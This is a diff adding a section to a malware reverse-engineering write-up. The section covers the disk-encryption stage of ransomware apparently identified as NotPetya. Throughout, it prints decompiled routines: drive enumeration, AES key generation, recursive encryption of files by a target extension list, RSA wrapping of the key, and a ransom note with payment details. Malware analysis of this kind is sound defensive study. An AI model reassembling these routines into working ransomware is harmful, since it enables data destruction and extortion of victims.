@@ -9656,6 +9656,541 @@ This finishes the first thread started inside the loop.
 
 
 
+> EternalBlue
+> ==========================
+>        Time Skip
+> ==========================
+> (because we are running out of time and EternalBlue is huge we at least want to see disk encryption in our ransomware...)
+
+### Back to Ordinal_1
+
+Next we see the following statement.
+
+```cpp
+if ((detected_anti_virus & 0x10) != 0) {
+  FUN_10001eef();
+}
+```
+
+This check again seems to just be present to see if anti virus detection was performed yet as it checks bit 5, which does not store any information.
+
+### FUN_10001eef
+
+```cpp
+void FUN_10001eef(void){
+  DWORD DVar1;
+  UINT UVar2;
+  undefined4 *lpParameter;
+  int iVar3;
+  undefined4 local_c;
+  undefined4 local_8;
+  
+  DVar1 = GetLogicalDrives();
+  iVar3 = 0x1f;
+  do {
+    if ((DVar1 & 1 << ((byte)iVar3 & 0x1f)) != 0) {
+      local_c = CONCAT22(0x3a,(short)iVar3 + 0x41);
+      local_8 = 0x5c;
+      UVar2 = GetDriveTypeW((LPCWSTR)&local_c);
+      if (UVar2 == 3) {
+        lpParameter = (undefined4 *)LocalAlloc(0x40,0x20);
+        if (lpParameter != (undefined4 *)0x0) {
+          lpParameter[4] = 0x10010550;
+          lpParameter[7] = 0;
+          *lpParameter = local_c;
+          lpParameter[1] = local_8;
+          CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_10001e51,lpParameter,0,(LPDWORD)0x0);
+        }
+      }
+    }
+    iVar3 = iVar3 + -1;
+  } while (-1 < iVar3);
+  return;
+}
+```
+
+This function appears rather straight forward, first a bit mask representing the currently avaialble disk drives is retreived using [GetLogicalDrives](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-getlogicaldrives). We then see a dedicated thread being started for each of the drives in the system running `FUN_10001e51`.
+
+### FUN_10001e51
+
+```cpp
+undefined4 FUN_10001e51(LPCWSTR param_1){
+  BOOL BVar1;
+  DWORD dwFlags;
+  int iVar2;
+  wchar_t *szProvider;
+  
+  BVar1 = CryptAcquireContextW
+                    ((HCRYPTPROV *)(param_1 + 4),(LPCWSTR)0x0,
+                     L"Microsoft Enhanced RSA and AES Cryptographic Provider",0x18,0xf0000000);
+  if (BVar1 == 0) {
+    dwFlags = GetLastError();
+    if (dwFlags == 0x80090019) {
+      dwFlags = 0xf0000000;
+      szProvider = (LPCWSTR)0x0;
+    }
+    else {
+      if (dwFlags != 0x80090016) goto LAB_10001edf;
+      dwFlags = 8;
+      szProvider = L"Microsoft Enhanced RSA and AES Cryptographic Provider";
+    }
+    BVar1 = CryptAcquireContextW((HCRYPTPROV *)(param_1 + 4),(LPCWSTR)0x0,szProvider,0x18,dwFlags);
+    if (BVar1 == 0) goto LAB_10001edf;
+  }
+  iVar2 = FUN_10001b4e();
+  if (iVar2 != 0) {
+    FUN_10001973(param_1,0xf,(int)param_1);
+    FUN_10001d32(param_1);
+    CryptDestroyKey(*(HCRYPTKEY *)(param_1 + 10));
+  }
+  CryptReleaseContext(*(HCRYPTPROV *)(param_1 + 4),0);
+LAB_10001edf:
+  LocalFree(param_1);
+  return 0;
+}
+```
+
+This function simply tries to acquire a cryto contex using [CryptAcquireContextW](https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptacquirecontexta). If first tries to do so with support for `CRYPT_VERIFYCONTEXT` which is mainly intended for application that use emhemeral keys. If this fails `CRYPT_NEWKEYSET` is used as a fall back which creates a new key container. If both fail the function returns.
+
+The next thing we see a call to `FUN_10001b4e`.
+
+### FUN_10001b4e
+
+```cpp
+BOOL FUN_10001b4e(void){
+  HCRYPTKEY *phKey;
+  int in_EAX;
+  BOOL BVar1;
+  undefined4 local_c;
+  undefined4 local_8;
+  
+  phKey = (HCRYPTKEY *)(in_EAX + 0x14);
+  BVar1 = CryptGenKey(*(HCRYPTPROV *)(in_EAX + 8),0x660e,1,phKey);
+  if (BVar1 != 0) {
+    local_8 = 1;
+    CryptSetKeyParam(*phKey,4,(BYTE *)&local_8,0);
+    local_c = 1;
+    CryptSetKeyParam(*phKey,3,(BYTE *)&local_c,0);
+  }
+  return BVar1;
+}
+```
+
+We will first add custom storage for `EAX`.
+
+```cpp
+BOOL FUN_10001b4e(int param_1){
+  HCRYPTKEY *phKey;
+  BOOL BVar1;
+  undefined4 local_c;
+  undefined4 local_8;
+  
+  phKey = (HCRYPTKEY *)(param_1 + 0x14);
+  BVar1 = CryptGenKey(*(HCRYPTPROV *)(param_1 + 8),0x660e,1,phKey);
+  if (BVar1 != 0) {
+    local_8 = 1;
+    CryptSetKeyParam(*phKey,4,(BYTE *)&local_8,0);
+    local_c = 1;
+    CryptSetKeyParam(*phKey,3,(BYTE *)&local_c,0);
+  }
+  return BVar1;
+}
+```
+
+Next we see a crypto graph key being generated of the type `0x660e` which maps to `CALG_AES_128`. The key is also made with the `CRYPT_EXPORTABLE` flag meaning it can be transferred out of hte CSP into a key blob. The generated key itself is stored in `phKey`.
+
+Given that the key was created succesfully we see two parameters being set on it. The first is `KP_MODE` which is set to `CRYPT_MODE_CBC` and the second is `KP_PADDING` which is set to `PKCS5_PADDING`.
+
+This ends the function and the key is returned inside `param_1` which represents a larger structure we have not yet identified. We will rename the function to `generate_key`.
+
+### Back to FUN_10001e51
+
+Back we see that if key generation was succesful two function are invoked, the first being `FUN_10001973`.
+
+### FUN_10001973
+
+```void FUN_10001973(LPCWSTR param_1,int param_2,int param_3){
+  ushort uVar1;
+  short sVar2;
+  LPWSTR pWVar3;
+  HANDLE hFindFile;
+  DWORD DVar4;
+  int iVar5;
+  ushort *puVar6;
+  BOOL BVar7;
+  ushort *puVar8;
+  short *psVar9;
+  bool bVar10;
+  uint local_870;
+  ushort local_844;
+  ushort local_842 [273];
+  WCHAR local_620 [260];
+  WCHAR local_418 [260];
+  WCHAR local_210 [262];
+  
+  if (((param_2 != 0) && (pWVar3 = PathCombineW(local_418,param_1,L"*"), pWVar3 != (LPWSTR)0x0)) &&
+     (hFindFile = FindFirstFileW(local_418,(LPWIN32_FIND_DATAW)&local_870),
+     hFindFile != (HANDLE)0xffffffff)) {
+    do {
+      if ((*(HANDLE *)(param_3 + 0x1c) != (HANDLE)0x0) &&
+         ((DVar4 = WaitForSingleObject(*(HANDLE *)(param_3 + 0x1c),0), DVar4 == 0 ||
+          (DVar4 == 0xffffffff)))) break;
+      puVar8 = &DAT_10010a70;
+      puVar6 = (ushort *)(&local_870 + 0x2c);
+      do {
+        uVar1 = *puVar6;
+        bVar10 = uVar1 < *puVar8;
+        if (uVar1 != *puVar8) {
+LAB_10001a22:
+          iVar5 = (1 - (uint)bVar10) - (uint)(bVar10 != false);
+          goto LAB_10001a27;
+        }
+        if (uVar1 == 0) break;
+        uVar1 = puVar6[1];
+        bVar10 = uVar1 < puVar8[1];
+        if (uVar1 != puVar8[1]) goto LAB_10001a22;
+        puVar6 = puVar6 + 2;
+        puVar8 = puVar8 + 2;
+      } while (uVar1 != 0);
+      iVar5 = 0;
+LAB_10001a27:
+      if (iVar5 != 0) {
+        puVar8 = &DAT_10010a74;
+        puVar6 = (ushort *)(&local_870 + 0x2c);
+        do {
+          uVar1 = *puVar6;
+          bVar10 = uVar1 < *puVar8;
+          if (uVar1 != *puVar8) {
+LAB_10001a5e:
+            iVar5 = (1 - (uint)bVar10) - (uint)(bVar10 != false);
+            goto LAB_10001a63;
+          }
+          if (uVar1 == 0) break;
+          uVar1 = puVar6[1];
+          bVar10 = uVar1 < puVar8[1];
+          if (uVar1 != puVar8[1]) goto LAB_10001a5e;
+          puVar6 = puVar6 + 2;
+          puVar8 = puVar8 + 2;
+        } while (uVar1 != 0);
+        iVar5 = 0;
+LAB_10001a63:
+        if ((iVar5 != 0) &&
+           (pWVar3 = PathCombineW(local_620,param_1,(LPCWSTR)(&local_870 + 0x2c)),
+           pWVar3 != (LPWSTR)0x0)) {
+          if (((local_870 & 0x10) == 0) || ((local_870 & 0x400) != 0)) {
+            pWVar3 = PathFindExtensionW((LPCWSTR)(&local_870 + 0x2c));
+            psVar9 = (short *)(&local_870 + 0x2c);
+            do {
+              sVar2 = *psVar9;
+              psVar9 = psVar9 + 1;
+            } while (sVar2 != 0);
+            if (pWVar3 != (LPWSTR)(&local_870 +
+                                  ((int)((int)psVar9 - (int)(&local_870 + 0x2e)) >> 1) * 2 + 0x2c))
+            {
+              wsprintfW(local_210,L"%ws.",pWVar3);
+              pWVar3 = StrStrIW(
+                                L".3ds.7z.accdb.ai.asp.aspx.avhd.back.bak.c.cfg.conf.cpp.cs.ctl.dbf.disk.djvu.doc.docx.dwg.eml.fdb.gz.h.hdd.kdbx.mail.mdb.msg.nrg.ora.ost.ova.ovf.pdf.php.pmf.ppt.pptx.pst.pvi.py.pyc.rar.rtf.sln.sql.tar.vbox.vbs.vcb.vdi.vfd.vmc.vmdk.vmsd.vmx.vsdx.vsv.work.xls.xlsx.xvd.zip."
+                                ,local_210);
+              if (pWVar3 != (LPWSTR)0x0) {
+                FUN_1000189a(local_620,param_3);
+              }
+            }
+          }
+          else {
+            pWVar3 = StrStrIW(L"C:\\Windows;",local_620);
+            if (pWVar3 == (LPWSTR)0x0) {
+              FUN_10001973(local_620,param_2 + -1,param_3);
+            }
+          }
+        }
+      }
+      BVar7 = FindNextFileW(hFindFile,(LPWIN32_FIND_DATAW)&local_870);
+    } while (BVar7 != 0);
+    FindClose(hFindFile);
+  }
+  return;
+}
+```
+
+This function appears to have a rather simple setup It takes the path passes via `param_1` which we know to be `drive:\` for the first iteration and then appends a wildcard `*` to it. This search path is then used in calls to [FindFirstFileW](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-findfirstfilew) to iterate over all the files and folders in the directory.
+
+We will start by retyping `local_870` to be of the correct [WIN32_FIND_DATAW](https://docs.microsoft.com/nl-nl/windows/win32/api/minwinbase/ns-minwinbase-win32_find_dataa) type and by renaming some variables.
+
+Next we see a bunch of loops that appear to be primarily focussed on moving around data. The two globals used have the value `2e 00` which in ASCII would map to `. `. Mostly this just seems to be a check. And eventually all execution paths end at `LAB_10001a63` which is where is gets interseting.
+
+Here we first see a filepath being created for the current file in the iteration. After this it is check if the file either does not have the `0x10` attribute which maps to `FILE_ATTRIBUTE_DIRECTORY` identifying directories or if it does have the `0x400` attribute which maps to `FILE_ATTRIBUTE_REPARSE_POINT` identifying symbolic links.
+
+If this check fails then the function recursively invokes itself with the `filepath` after verifying taht it does not contain `C:\Windows;` using [StrStrIW](https://docs.microsoft.com/en-us/windows/win32/api/shlwapi/nf-shlwapi-strstriw). This is of course used to recursively parse directories.
+
+Next we check the larger branch that handles file paths that are not directories.
+
+First we see that the extension of the file is retrieved and stored in `pWVar3`, second we see the file name being copied into `pWVar8`. Next is an if statement that appears to check that the location of the extensions dot in the file name is not equal to the length of hte file name, implying that the file should not be extensionless.
+
+After this we see the extension being stored in `local_210` with an additional `.` at the end which is then followed up by a `StrStrIW` search using `.3ds.7z.accdb.ai.asp.aspx.avhd.back.bak.c.cfg.conf.cpp.cs.ctl.dbf.disk.djvu.doc.docx.dwg.eml.fdb.gz.h.hdd.kdbx.mail.mdb.msg.nrg.ora.ost.ova.ovf.pdf.php.pmf.ppt.pptx.pst.pvi.py.pyc.rar.rtf.sln.sql.tar.vbox.vbs.vcb.vdi.vfd.vmc.vmdk.vmsd.vmx.vsdx.vsv.work.xls.xlsx.xvd.zip.`.
+
+If the extension was found in this string (meaning it's one of the listed extensions) then `FUN_1000189a` is invoked, otherwise the file is ignored.
+
+### FUN_1000189a
+
+```cpp
+void FUN_1000189a(LPCWSTR filepath,int param_2){
+  HANDLE hFile;
+  BYTE *pbData;
+  BOOL BVar1;
+  DWORD dwMaximumSizeLow;
+  LPCWSTR local_1c;
+  int local_18;
+  HANDLE local_10;
+  HANDLE local_c;
+  BOOL local_8;
+  
+  hFile = CreateFileW(filepath,0xc0000000,0,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
+  if (hFile != (HANDLE)0xffffffff) {
+    local_10 = hFile;
+    GetFileSizeEx(hFile,(PLARGE_INTEGER)&local_1c);
+    local_8 = 0;
+    if ((local_18 < 0) || ((local_18 < 1 && (local_1c < (LPCWSTR)0x100001)))) {
+      filepath = local_1c;
+      local_8 = 1;
+      dwMaximumSizeLow = (((uint)local_1c >> 4) + 1) * 0x10;
+    }
+    else {
+      filepath = (LPCWSTR)0x100000;
+      dwMaximumSizeLow = 0x100000;
+    }
+    local_c = CreateFileMappingW(hFile,(LPSECURITY_ATTRIBUTES)0x0,4,0,dwMaximumSizeLow,(LPCWSTR)0x0)
+    ;
+    if (local_c != (HANDLE)0x0) {
+      pbData = (BYTE *)MapViewOfFile(local_c,6,0,0,(SIZE_T)filepath);
+      if (pbData != (BYTE *)0x0) {
+        BVar1 = CryptEncrypt(*(HCRYPTKEY *)(param_2 + 0x14),0,local_8,0,pbData,(DWORD *)&filepath,
+                             dwMaximumSizeLow);
+        if (BVar1 != 0) {
+          FlushViewOfFile(pbData,(SIZE_T)filepath);
+        }
+        UnmapViewOfFile(pbData);
+      }
+      CloseHandle(local_c);
+    }
+    CloseHandle(local_10);
+  }
+  return;
+}
+```
+
+This function is rather straight forward, first we see the passed file being opened and then it's size retrieved.
+
+Then we see some computations that result in a call to [CreateFileMappingW](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-createfilemappingw) which opens a named or unnamed file mapping object for a specific file. The mapping is made with `PAGE_READWRITE` protection and the maximum page size is as compued before.
+
+Assuming this mapping handle was created succesfully then [MapViewOfFile](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-mapviewoffile) is invoked to map a view of the file mapping into the address space of the calling process.
+
+Next we see a call to the [CryptEncrypt](https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptencrypt) function to encrypt the mapping view using the key created earlier (same `+0x14` field offset). The entire file mapping to memory is encrypted by this call.
+
+Next we see a call to [FlushViewOfFile](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-flushviewoffile) which commits the changes to file mapping to the actual file stored on disk and this effectively encrypts the entire file. 
+
+After this we see some more cleanup but nothing special. It's interseting how the entire file is first mapped to memory before being encrypted. We will rename the function to `encrypt_file`.
+
+### Back to FUN_10001973
+
+We will rename this function to `find_and_encrypt_files`.
+
+### Back to FUN_10001e51
+
+Having parsed the first function which does the actual encryption of all the data on the disk we move on to the second function called `FUN_10001d32`.
+
+### FUN_10001d32
+
+```cpp
+void FUN_10001d32(LPCWSTR param_1){
+  short sVar1;
+  BOOL BVar2;
+  LPWSTR pWVar3;
+  uint uVar4;
+  HANDLE hFile;
+  short *psVar5;
+  WCHAR local_624 [780];
+  short *local_c;
+  DWORD local_8;
+  
+  BVar2 = FUN_10001ba0((int)param_1);
+  if ((BVar2 != 0) && (local_c = (short *)FUN_10001c7f(), local_c != (short *)0x0)) {
+    pWVar3 = PathCombineW(local_624,param_1,L"README.TXT");
+    if (pWVar3 != (LPWSTR)0x0) {
+      uVar4 = minutes_left_before_cmd_arg1_reached();
+      if (uVar4 != 0) {
+        Sleep((uVar4 - 1) * 60000);
+      }
+      hFile = CreateFileW(local_624,0x40000000,0,(LPSECURITY_ATTRIBUTES)0x0,2,0,(HANDLE)0x0);
+      if (hFile != (HANDLE)0xffffffff) {
+        local_8 = 0;
+        WriteFile(hFile,
+                  L"Ooops, your important files are encrypted.\r\n\r\nIf you see this text, thenyour files are no longer accessible, because\r\nthey have been encrypted. Perhapsyou are busy looking for a way to recover\r\nyour files, but don\'t waste yourtime. Nobody can recover your files without\r\nour decryption service.\r\n\r\nWeguarantee that you can recover all your files safely and easily.\r\nAll you needto do is submit the payment and purchase the decryption key.\r\n\r\nPlease followthe instructions:\r\n\r\n1.\tSend $300 worth of Bitcoin to followingaddress:\r\n\r\n"
+                  ,0x432,&local_8,(LPOVERLAPPED)0x0);
+        WriteFile(hFile,L"1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX\r\n\r\n",0x4c,&local_8,
+                  (LPOVERLAPPED)0x0);
+        WriteFile(hFile,L"2.\tSend your Bitcoin wallet ID and personal installation key to e-mail ",
+                  0x8e,&local_8,(LPOVERLAPPED)0x0);
+        WriteFile(hFile,L"wowsmith123456@posteo.net.\r\n",0x38,&local_8,(LPOVERLAPPED)0x0);
+        WriteFile(hFile,L"\tYour personal installation key:\r\n\r\n",0x48,&local_8,(LPOVERLAPPED)0x0
+                 );
+        psVar5 = local_c;
+        do {
+          sVar1 = *psVar5;
+          psVar5 = psVar5 + 1;
+        } while (sVar1 != 0);
+        WriteFile(hFile,local_c,((int)((int)psVar5 - (int)(local_c + 1)) >> 1) * 2,&local_8,
+                  (LPOVERLAPPED)0x0);
+        CloseHandle(hFile);
+      }
+    }
+    LocalFree(*(HLOCAL *)(param_1 + 0xc));
+  }
+  return;
+}
+```
+
+This function appears pretty obvious, but before we recover the message left we look at the call to `FUN_10001ba0`.
+
+### FUN_10001ba0
+
+```cpp
+BOOL FUN_10001ba0(int param_1){
+  BOOL BVar1;
+  BYTE *pbBinary;
+  BYTE *pbData;
+  BOOL local_18;
+  DWORD local_c;
+  DWORD local_8;
+  
+  local_18 = 0;
+  local_8 = 0;
+  BVar1 = CryptStringToBinaryW
+                    (*(LPCWSTR *)(param_1 + 0x10),0,1,(BYTE *)0x0,&local_8,(DWORD *)0x0,(DWORD *)0x0
+                    );
+  if ((BVar1 != 0) && (pbBinary = (BYTE *)LocalAlloc(0x40,local_8), pbBinary != (BYTE *)0x0)) {
+    BVar1 = CryptStringToBinaryW
+                      (
+                       L"MIIBCgKCAQEAxP/VqKc0yLe9JhVqFMQGwUITO6WpXWnKSNQAYT0O65Cr8PjIQInTeHkXEjfO2n2JmURWV/uHB0ZrlQ/wcYJBwLhQ9EqJ3iDqmN19Oo7NtyEUmbYmopcq+YLIBZzQ2ZTK0A2DtX4GRKxEEFLCy7vP12EYOPXknVy/+mf0JFWixz29QiTf5oLu15wVLONCuEibGaNNpgq+CXsPwfITDbDDmdrRIiUEUw6o3pt5pNOskfOJbMan2TZu6zfhzuts7KafP5UA8/0Hmf5K3/F9Mf9SE68EZjK+cIiFlKeWndP0XfRCYXI9AJYCeaOu7CXF6U0AVNnNjvLeOn42LHFUK4o6JwIDAQAB"
+                       ,0,1,pbBinary,&local_8,(DWORD *)0x0,(DWORD *)0x0);
+    if (BVar1 != 0) {
+      local_c = 0;
+      BVar1 = CryptDecodeObjectEx(0x10001,(LPCSTR)0x13,pbBinary,local_8,0,(PCRYPT_DECODE_PARA)0x0,
+                                  (void *)0x0,&local_c);
+      if ((BVar1 != 0) && (pbData = (BYTE *)LocalAlloc(0x40,local_c), pbData != (BYTE *)0x0)) {
+        BVar1 = CryptDecodeObjectEx(0x10001,(LPCSTR)0x13,pbBinary,local_8,0,(PCRYPT_DECODE_PARA)0x0,
+                                    pbData,&local_c);
+        if (BVar1 != 0) {
+          local_18 = CryptImportKey(*(HCRYPTPROV *)(param_1 + 8),pbData,local_c,0,0,
+                                    (HCRYPTKEY *)(param_1 + 0xc));
+        }
+        LocalFree(pbData);
+      }
+    }
+    LocalFree(pbBinary);
+  }
+  return local_18;
+}
+```
+
+This function converts a string to bytes using [CryptStringToBinaryW](https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptstringtobinaryw). The first is some field in the `param_1` structure we have not yet been able to identify and the second is in the code as a string. The first call also only seems to serve as a way to get the number of bytes required to allocate to hold the data.
+
+The second call operates on the following string.
+
+> MIIBCgKCAQEAxP/VqKc0yLe9JhVqFMQGwUITO6WpXWnKSNQAYT0O65Cr8PjIQInTeHkXEjfO2n2JmURWV/uHB0ZrlQ/wcYJBwLhQ9EqJ3iDqmN19Oo7NtyEUmbYmopcq+YLIBZzQ2ZTK0A2DtX4GRKxEEFLCy7vP12EYOPXknVy/+mf0JFWixz29QiTf5oLu15wVLONCuEibGaNNpgq+CXsPwfITDbDDmdrRIiUEUw6o3pt5pNOskfOJbMan2TZu6zfhzuts7KafP5UA8/0Hmf5K3/F9Mf9SE68EZjK+cIiFlKeWndP0XfRCYXI9AJYCeaOu7CXF6U0AVNnNjvLeOn42LHFUK4o6JwIDAQAB
+
+Given that the string is `360` characters long we would expect to need about `2880` bits to store it.
+
+Next we see a call to [CryptDecodeObjectEx](https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptdecodeobjectex). The structure type is passed as `0x13` which maps to deciaml 19 which means `RSA_CSP_PUBLICKEYBLOB`. The function is also called twice in order to first figure out the size and then retrieve the data. we also see that the decoded object is then imported as a cryptographic key using [CryptImportKey](https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptimportkey) this also means that `pbData` contains a [PUBLICKEYSTRUC](https://docs.microsoft.com/nl-nl/windows/win32/api/wincrypt/ns-wincrypt-publickeystruc) blob header and after that the encrypted key. It also reveals that `param_1 + 0xc` receives the handle of the imported key. Given this information it is likely to be a `2048` bits RSA public key (of the malware author). We will call this function `import_rsa_key`.
+
+### Back to FUN_10001d32
+
+Having imported the RSA key we can now move on to the next function called in the if statement `FUN_10001c7f` which does not appear to take any arguments.
+
+### FUN_10001c7f
+
+```cpp
+LPWSTR FUN_10001c7f(void){
+  LPWSTR pWVar1;
+  int in_EAX;
+  BOOL BVar2;
+  BYTE *pbData;
+  LPWSTR pszString;
+  LPWSTR local_14;
+  DWORD local_c;
+  DWORD local_8;
+  
+  local_14 = (LPWSTR)0x0;
+  local_8 = 0;
+  BVar2 = CryptExportKey(*(HCRYPTKEY *)(in_EAX + 0x14),*(HCRYPTKEY *)(in_EAX + 0xc),1,0,(BYTE *)0x0,
+                         &local_8);
+  if ((BVar2 != 0) && (pbData = (BYTE *)LocalAlloc(0x40,local_8), pbData != (BYTE *)0x0)) {
+    BVar2 = CryptExportKey(*(HCRYPTKEY *)(in_EAX + 0x14),*(HCRYPTKEY *)(in_EAX + 0xc),1,0,pbData,
+                           &local_8);
+    pWVar1 = local_14;
+    if (BVar2 != 0) {
+      local_c = 0;
+      BVar2 = CryptBinaryToStringW(pbData,local_8,1,(LPWSTR)0x0,&local_c);
+      if (((BVar2 != 0) &&
+          (pszString = (LPWSTR)LocalAlloc(0x40,local_c * 2), pszString != (LPWSTR)0x0)) &&
+         (BVar2 = CryptBinaryToStringW(pbData,local_8,1,pszString,&local_c), pWVar1 = pszString,
+         BVar2 == 0)) {
+        LocalFree(pszString);
+        pWVar1 = local_14;
+      }
+    }
+    local_14 = pWVar1;
+    LocalFree(pbData);
+  }
+  return local_14;
+}
+```
+
+First we add custom storage for `EAX`. This reveals that `param_1` was actually passed to this function which makes sense. In this function we see the key that was used to encrypt the file system `param_1 + 0x14` being exported using [CryptExportKey](https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptexportkey). It should be noted that the key being exported is encrypted with the key at `param_1 + 0xc` which is the RSA public key we just imported. After it is exported it is then converted to a string using [CryptBinaryToStringW](https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptbinarytostringw). After moving through several variables it is then returned from the function. So we will rename the function to `export_encryption_key`.
+
+### Back to FUN_10001d32
+
+Having exported the encryption key we move on the message. First of all we see that the number of minutes left before the first command line argument is reached is retrieved and the thread is then suspended until 1 minute before this time.
+
+At that time a new file called `README.TXT` is created at the root of the drive and opened for writing. The content written to the file is the following.
+
+> Ooops, your important files are encrypted.
+> 
+> If you see this text, then your files are no longer accessible, because
+> they have been encrypted. Perhaps you are busy looking for a way to recover
+> your files, but don't waste your time. Nobody can recover your files without
+> our decryption service.
+> 
+> We guarantee that you can recover all your files safely and easily.
+> All you need to do is submit the payment and purchase the decryption key.
+> 
+> Please followthe instructions:
+> 
+> 1.	Send $300 worth of Bitcoin to followingaddress:
+> 
+> 1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX
+> 
+> 2.	Send your Bitcoin wallet ID and personal installation key to e-mail wowsmith123456@posteo.net.
+> 	Your personal installation key:
+> 
+> 
+
+The encrypted encryption key would be added at the end of this message. We will rename the function to `write_ransom_note`.
+
+### Back to FUN_10001e51
+
+After writing the ransom note there's not a whole lot left, care is taken to destroy and free the cryptographic keys and data but that's it. We will rename this function to `encrypt_drive`.
+
+### Back to FUN_10001eef
+
+This also effectively finsihes this function, the interesting part is that each drive gets its own key. It's a pity that we never managed to figure out the exact structure for `param_1` though, it's probably custom (though we have enough information to reconstruct it by now, but that's a bit too late). We will rename this function to `encrypt_all_drives`. And that pretty much wraps up the last encryption part of the malware.
+
+### Back to Ordinal_1
+
+
+
+
+
+
 
 
 
